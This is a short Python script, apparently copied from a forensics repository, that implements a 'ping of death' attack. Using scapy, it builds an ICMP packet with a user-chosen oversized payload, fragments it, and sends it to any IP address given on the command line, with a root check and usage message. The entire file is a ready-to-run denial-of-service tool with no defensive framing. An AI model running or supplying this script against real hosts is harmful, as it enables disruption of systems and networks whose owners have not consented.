#!/usr/bin/env python3

# Source : https://github.com/it-forensics/forensics/blob/master/src/ping-of-death.py

import sys,os
from scapy.all import send, fragment, IP, ICMP

def IpFlood(ip,size=1000):
  send(fragment(IP(dst=ip) / ICMP() / ("X"*size)),verbose=False)

def main():
  if os.getuid() != 0:
    print("Please run it as root or use sudo")
    exit(1) 
  if len(sys.argv) < 2:
    print("Usage : pipenv run ./ping_of_death.py {IP} {Size=1000}")
    sys.exit(1)
  else:
    ip=sys.argv[1]
    if len(sys.argv) >= 3:
      nb=int(sys.argv[2])
    else:
      nb=1000
    IpFlood(ip,nb)

if __name__ == '__main__':
  main()
